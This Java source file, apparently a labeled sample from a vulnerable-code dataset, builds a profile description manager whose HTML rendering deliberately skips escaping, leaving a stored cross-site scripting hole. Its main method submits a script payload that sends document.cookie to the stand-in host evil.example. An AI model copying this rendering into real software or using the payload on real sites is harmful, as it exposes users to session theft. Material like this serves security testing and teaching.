import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * User Profile Description Manager
 *
 * Allows users to update a profile description, store multiple profile description records,
 * and render them as an HTML page for display.
 *
 * NOTE: This version intentionally contains a Cross-Site Scripting (XSS)
 * vulnerability for demonstration/testing purposes: user-supplied text is
 * written directly into the generated HTML without any escaping.
 */
public class java_vulnerable_0032_claude {

    private final List<Map<String, String>> records = new ArrayList<>();

    /**
     * Stores a new profile description record.
     */
    public void submitRecord(String username, String description, String location) {
        Map<String, String> record = new HashMap<>();
        record.put("owner", username);
        record.put("subject", description);
        record.put("extra", location);
        records.add(record);
    }

    /**
     * Updates the profile description of the most recently matching record, or adds a new one
     * if none exists with the given owner value.
     */
    public void updateDescription(String username, String newDescriptionText) {
        for (Map<String, String> record : records) {
            if (record.get("owner").equals(username)) {
                record.put("subject", newDescriptionText);
                return;
            }
        }
        submitRecord(username, newDescriptionText, "");
    }

    public List<Map<String, String>> getAllRecords() {
        return records;
    }

    public Map<String, String> findByOwner(String username) {
        for (Map<String, String> record : records) {
            if (record.get("owner").equals(username)) {
                return record;
            }
        }
        return null;
    }

    /**
     * Renders every stored record as an HTML fragment.
     *
     * VULNERABLE: the owner, subject text, and extra field are inserted
     * directly into the HTML output with no sanitization or escaping,
     * allowing stored/reflected script injection.
     */
    public String renderPage() {
        StringBuilder html = new StringBuilder();
        html.append("<html><head><title>User Profile Description Manager</title></head><body>");
        html.append("<h1>User Profile Description Manager</h1>");
        for (Map<String, String> record : records) {
            html.append("<div class=\"record\">");
            html.append("<h3>").append(record.get("owner")).append("</h3>");
            html.append("<p>").append(record.get("subject")).append("</p>");
            html.append("<span class=\"extra\">").append(record.get("extra")).append("</span>");
            html.append("</div>");
        }
        html.append("</body></html>");
        return html.toString();
    }

    public static void main(String[] args) {
        java_vulnerable_0032_claude app = new java_vulnerable_0032_claude();

        // A normal, legitimate submission.
        app.submitRecord("msmith", "This is a normal profile description entry submitted by a regular user.", "Austin, TX");

        // A malicious submission containing an XSS payload. In the vulnerable
        // implementation this payload is stored and later rendered verbatim.
        app.submitRecord("attacker", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>", "n/a");

        // Demonstrate an update.
        app.updateDescription("msmith", "This is an updated profile description after the user made changes.");

        System.out.println("Stored records: " + app.getAllRecords().size());
        System.out.println("---- Rendered page output ----");
        System.out.println(app.renderPage());
    }
}
